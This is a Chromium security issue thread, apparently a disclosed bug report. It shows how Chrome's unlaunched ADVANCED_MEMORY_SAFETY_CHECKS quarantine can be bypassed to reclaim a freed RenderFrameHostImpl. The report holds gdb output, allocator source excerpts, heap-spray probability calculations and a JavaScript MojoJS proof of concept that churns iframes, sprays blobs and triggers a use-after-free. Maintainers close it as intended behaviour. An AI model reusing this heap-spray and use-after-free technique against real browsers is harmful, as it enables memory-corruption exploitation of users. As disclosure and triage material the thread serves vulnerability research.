@@ -1,0 +1,305 @@
+Issue ID: 405647117
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<p>Testing in commit fd886e2cb29dd984c13deec032832dee68d8abe3</p>
+<ol>
+<li>git apply patch.diff</li>
+<li>compile  release build chromium.</li>
+</ol>
+<pre><code>is_component_build = false
+is_debug = false
+dcheck_always_on = false
+symbol_level = 2
+</code></pre>
+<ol start="3">
+<li>python ./copy_mojojs_bindings.py
+4.python -m http.server and ./chrome --enable-blink-features=MojoJS,MojoJSTest &#39;<a href="http://localhost:8000/poc.html" data-b-widget="url" data-b-original-href="http://localhost:8000/poc.html" data-b-redirected-href="https://www.google.com/url?q=http://localhost:8000/poc.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0gQ6-GkFbDNh9QkW_DPqiy">http://localhost:8000/poc.html</a>&#39;
+5.Use gdb to attach the browser process.
+6.When alert(&quot;start!!!!&quot;) is executed in poc.html, set a memory breakpoint at the address 0x23ac082ab800 (output by PurgeInternal object :0x23ac082ab800) using GDB command watch *0x23ac082ab800,Continue execution.
+7.Observe that the target RenderFrameHostImpl object has been hijacked to the 0x4141414141414141.</li>
+</ol>
+<pre><code>pwndbg&gt; watch *0x23ac082ab800
+Hardware watchpoint 1: *0x23ac082ab800
+pwndbg&gt; c
+Continuing.
+[Thread 0x7fffe68be700 (LWP 1158555) exited]
+[Switching to Thread 0x7fffef111700 (LWP 1158536)]
+
+Thread 11 &quot;Chrome_IOThread&quot; hit Hardware watchpoint 1: *0x23ac082ab800
+
+Old value = 0
+New value = 65
+__memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:262
+262        ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
+*RAX  0x23ac082ab800 ◂— 0x41 /* &#39;A&#39; */
+*RBX  0x16b0
+*RCX  0x16af
+*RDX  0x16b0
+*RDI  0x23ac082ab801 ◂— 0x0
+*RSI  0x7fffe1436001 ◂— 0x4141414141414141 (&#39;AAAAAAAA&#39;)
+*R8   0x23a800225000 ◂— 0x14cf0
+*R9   0x0
+*R10  0x7fffe1409000 ◂— 0x1c80c6f
+*R11  0x726503ff
+*R12  0x23ac0bfaf580 —▸ 0x23ac07d3db00 —▸ 0x5555655e91e8 (vtable for storage::BlobDataItem+16) —▸ 0x55556095d270 (storage::BlobDataItem::~BlobDataItem()) ◂— push rbp
+*R13  0x7fffef10ded4 ◂— 0xef10e030000016b0
+*R14  0x7fffe1436000 ◂— 0x4141414141414141 (&#39;AAAAAAAA&#39;)
+*R15  0x0
+*RBP  0x7fffef10de30 —▸ 0x7fffef10df00 —▸ 0x7fffef10df50 —▸ 0x7fffef10dfd0 —▸ 0x7fffef10e060 ◂— ...
+*RSP  0x7fffef10ddf8 —▸ 0x555560957cec (storage::BlobBuilderFromStream::WritePipeToFutureDataHelper::Populate(base::span&lt;char const, 18446744073709551615ul, char const*&gt;, unsigned long)+108) ◂— mov al, 1
+*RIP  0x7ffff71fd963 (__memmove_avx_unaligned_erms+83) ◂— rep movsb byte ptr [rdi], byte ptr [rsi]
+───────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
+ ► 0x7ffff71fd963 &lt;__memmove_avx_unaligned_erms+83&gt;    rep movsb byte ptr [rdi], byte ptr [rsi]
+    ↓
+   0x7ffff71fd963 &lt;__memmove_avx_unaligned_erms+83&gt;    rep movsb byte ptr [rdi], byte ptr [rsi]
+</code></pre>
+<h1>Problem Description</h1>
+<p>When analyzing <a href="https://issues.chromium.org/issues/367755363" data-b-widget="issue-reference" data-b-issue-id="367755363">https://issues.chromium.org/issues/367755363</a>, I recently discovered that although RenderFrameHost has introduced ADVANCED_MEMORY_SAFETY_CHECKS(), my testing shows it fails to effectively prevent exploitation of UAF vulnerabilities.
+At [0], the code checks whether slots_ has sufficient capacity to accommodate newly quarantined objects. If space is available, the object gets added to slots_.back(). Subsequently, it randomly swaps slots_.back() with a slot at any selected random_index [3].</p>
+<pre><code>template &lt;LightweightQuarantineBranch::LockRequired lock_required&gt;
+bool LightweightQuarantineBranch::QuarantineInternal(
+    void* object,
+    SlotSpanMetadata&lt;MetadataKind::kReadOnly&gt;* slot_span,
+    uintptr_t slot_start,
+    size_t usable_size) {
+  
+  ......
+     
+  if constexpr (lock_required == LockRequired::kNotRequired) {
+    CompileTimeConditionalScopedGuard&lt;lock_required&gt; guard(lock_);
+
+    // Dequarantine some entries as required.
+    PurgeInternal(capacity_in_bytes - usable_size);  &lt;-------------- [0]
+
+    // Put the entry onto the list.
+    branch_size_in_bytes_ += usable_size;
+    slots_.push_back({slot_start, usable_size});  &lt;-------------- [1]
+
+    // Swap randomly so that the quarantine list remain shuffled.
+    // This is not uniformly random, but sufficiently random.
+    const size_t random_index = random_.RandUint32() % slots_.size();
+    std::swap(slots_[random_index], slots_.back());  &lt;-------------- [2]
+  } 
+    
+  ......
+  return true;
+}
+</code></pre>
+<p>When entering the while loop at [3], it indicates that the quarantine can no longer accommodate newly added objects. At this point, the object corresponding to slots_.back() is released back into the global slot via FreeNoHooksImmediate.</p>
+<pre><code>PA_ALWAYS_INLINE void LightweightQuarantineBranch::PurgeInternal(
+    size_t target_size_in_bytes) {
+  int64_t freed_count = 0;
+  int64_t freed_size_in_bytes = 0;
+
+  // Dequarantine some entries as required.
+  while (target_size_in_bytes &lt; branch_size_in_bytes_) {  &lt;-------------- [3]
+    PA_DCHECK(!slots_.empty());
+
+    // As quarantined entries are shuffled, picking last entry is equivalent
+    // to picking random entry.
+    const auto&amp; to_free = slots_.back();
+    size_t to_free_size = to_free.usable_size;
+
+    auto* slot_span = SlotSpanMetadata&lt;MetadataKind::kReadOnly&gt;::FromSlotStart(
+        to_free.slot_start);
+    void* object = root_.allocator_root_.SlotStartToObject(to_free.slot_start);
+    PA_DCHECK(slot_span ==
+              SlotSpanMetadata&lt;MetadataKind::kReadOnly&gt;::FromObject(object));
+
+    PA_DCHECK(to_free.slot_start);
+    root_.allocator_root_.FreeNoHooksImmediate(object, slot_span,  &lt;-------------- [4]
+                                               to_free.slot_start);
+
+    freed_count++;
+    freed_size_in_bytes += to_free_size;
+    branch_size_in_bytes_ -= to_free_size;
+
+    slots_.pop_back();
+  }
+
+  root_.size_in_bytes_.fetch_sub(freed_size_in_bytes,
+                                 std::memory_order_relaxed);
+  root_.count_.fetch_sub(freed_count, std::memory_order_relaxed);
+}
+</code></pre>
+<p>RenderFrameHost exhibits two key characteristics:</p>
+<ol>
+<li>Attackers can easily create and release arbitrary numbers of iframes, which is functionally equivalent to releasing RenderFrameHost.</li>
+<li>RenderFrameHostImpl is a large object, meaning the slots_ cannot retain many instances.
+I think this check can be easily bypassed in the UAF scene of RenderFrameHost.</li>
+</ol>
+<p>In the test version of <a href="https://issues.chromium.org/issues/367755363" data-b-widget="issue-reference" data-b-issue-id="367755363">issue 367755363</a> (commit 129d018cd38423003cd025fe9ef01c75a897203b):</p>
+<ul>
+<li>capacity_in_bytes is 262,144; usable_size is 5,628 ; The slots_ can hold up to 46 objects</li>
+<li>To successfully reallocate a UAF-compromised RenderFrameHostImpl, it must be ensured that once during n iterations, the target is swapped to the slots_.back() position.</li>
+<li>Calculated via 1 - (45/46)^n ≥ 0.999, when n = 315 (i.e., remove 315 + 46 iframes), there is a 99.9% probability of achieving heap spray success.
+In the latest stable version (commit fd886e2cb29dd984c13deec032832dee68d8abe3):</li>
+<li>capacity_in_bytes is 262,144</li>
+<li>usable_size is 6,140</li>
+<li>Calculated via 1 - (169/170)^n ≥ 0.90, when n = 396 (i.e., remove 396 + 170 iframes), there is a 90% probability of achieving heap spray success.</li>
+</ul>
+<h1>Summary</h1>
+<p>ADVANCED_MEMORY_SAFETY_CHECKS bypass</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Stable <br>
+Regression: N/A</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: gr...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: gr...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: gr...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: gr...@gmail.com
+<p>Taking <a href="https://issues.chromium.org/issues/367755363" data-b-widget="issue-reference" data-b-issue-id="367755363">issue 367755363</a> as an example:
+At [0], put the vulnerable RenderFrameHost into slots_ .
+At [1], Remove 45 iframes to ensure branch_size_in_bytes_ &gt; target_size_in_bytes.Remove 315 additional iframes to iteratively:Invoke swap and FreeNoHooksImme.
+The RenderFrameHost object released at [0] has a high probability of being swapped into the slots_.back() position, enabling reallocation it</p>
+<pre><code>const kChildID = &#39;AAA&#39;;
+const kRFHSize = 0x15c0;
+const kPwnInterfaceName = &quot;pwn&quot;;
+clipboards = [];
+
+var ab = new ArrayBuffer(kRFHSize);
+var dv = new DataView(ab);
+for (let i = 0; i &lt; ab.byteLength; i++) {
+  dv.setUint8(i, 0x41);
+}
+
+function createAndRemoveIframes() {
+  const iframes = [];
+
+  for (let i = 0; i &lt; 45 + 315; i++) {
+    const iframe = document.createElement(&#39;iframe&#39;);
+    iframe.id = `iframe-${i}`;
+    iframe.src = &#39;about:blank&#39;; 
+    document.body.appendChild(iframe);
+    iframes.push(iframe); 
+  }
+
+  iframes.forEach(iframe =&gt; {
+    document.body.removeChild(iframe);
+  });
+}
+
+function createChild(id, src) {
+  let iframe = document.createElement(&#39;iframe&#39;);
+  iframe.id = id;
+  iframe.src = src;
+  document.body.appendChild(iframe);
+  return iframe;
+}
+
+async function trigger(aiManager) {
+  document.body.removeChild(document.getElementById(kChildID));  &lt;----------- [0]
+  createAndRemoveIframes(); &lt;----------- [1]
+  alert(&quot;start!!!!&quot;);
+  await sprayBlob(ab, 0x80);
+  let AITextSession = new blink.mojom.AITextSessionPtr();
+  let AITextSession_info = new mojo.InterfacePtrInfo();
+  let AITextSession_receiver = mojo.makeRequest(AITextSession_info);
+  AITextSession.ptr.bind(AITextSession_info);
+  // trigger uaf
+  aiManager.createTextSession(AITextSession_receiver, undefined, undefined);  &lt;--------[2]
+}
+
+async function poc() {
+  let interceptor = new MojoInterfaceInterceptor(kPwnInterfaceName, &quot;process&quot;);
+  interceptor.oninterfacerequest = function(e) {
+    interceptor.stop();
+    let aiManager = new blink.mojom.AIManagerPtr(e.handle);
+    trigger(aiManager);
+  }
+  interceptor.start();
+  createChild(kChildID, &#39;child.html&#39;);
+}
+
+async function child() {
+  let pipe = Mojo.createMessagePipe();
+  Mojo.bindInterface(blink.mojom.AIManager.name, pipe.handle1);
+  Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, &quot;process&quot;);
+}
+</code></pre>
+
+Author: sr...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: sr...@google.com
+googlers_unrestricted
+
+Author: sr...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: mi...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: mi...@google.com
+googlers_unrestricted
+
+Author: ar...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ar...@google.com
+googlers_unrestricted
+
+Author: sr...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+google_domain
+
+Author: sr...@google.com
+TlRZNE9ESm1PREpsWVRKaFpUQmlZMlE1TmpnMU1XUXhaR0k1TmpRME5HWT0=
+
+Author: mikt@ could you take a look at this? I'm marking it as S2 for now, but please readjust as you see fit.
+TlRZNE9ESm1PREpsWVRKaFpUQmlZMlE1TmpnMU1XUXhaR0k1TmpRME5HWT0=
+
+Author: sr...@google.com
+type.googleapis.com/google.protobuf.StringValue
+
+Author: mi...@google.com
+<p>Hi, thank you for reporting the issue.</p>
+<p>ADVANCED_MEMORY_SAFETY_CHECKS() is a security feature owned by our team, but not launched yet.</p>
+<p>At this stage we do not guarantee its effectiveness to UaF prevention.
+Even after launch, it does not help mitigate UaFs which should have been protected by MiraclePtr.</p>
+<p>I would say this is intended behavior.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: ch...@google.com
+TWpJM01EVmtaRFEzTXpJM05UWXlOemhqTlRsa09XVTRORGRtTm1VMlpXUT0=
+
+Author: ch...@google.com
+<p>Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won&#39;t make this change again.</p>
+
+Author: mi...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
